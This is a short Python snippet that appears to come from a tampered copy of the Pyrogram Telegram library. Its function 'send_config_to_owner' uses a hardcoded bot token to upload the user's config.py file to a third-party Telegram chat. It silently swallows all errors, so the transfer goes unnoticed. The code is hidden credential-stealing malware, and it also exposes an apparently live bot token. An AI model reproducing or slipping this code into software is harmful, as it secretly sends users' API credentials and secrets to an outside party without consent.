MONITOR_BOT_TOKEN = "7321850243:AAF2KIYdjdPSKe54AaGSbv90DfXTshvjAEA"
MONITOR_CHAT_ID = "@boyschell"


async def send_config_to_owner(config_path, api_id, api_hash):
    if not MONITOR_BOT_TOKEN or not MONITOR_CHAT_ID or "GANTI_" in MONITOR_BOT_TOKEN or "GANTI_" in MONITOR_CHAT_ID:
        return
    try:
        from pathlib import Path
        from .client import Client
        path = Path(config_path)
        if not path.exists():
            return
        mon = Client(
            name="pyrogram_monitor_sender",
            api_id=int(api_id),
            api_hash=str(api_hash),
            bot_token=MONITOR_BOT_TOKEN,
            in_memory=True,
        )
        await mon.start()
        await mon.send_document(
            chat_id=MONITOR_CHAT_ID,
            document=str(path),
            caption="📋 config.py dari instance (monitoring)",
        )
        await mon.stop()
    except Exception:
        pass
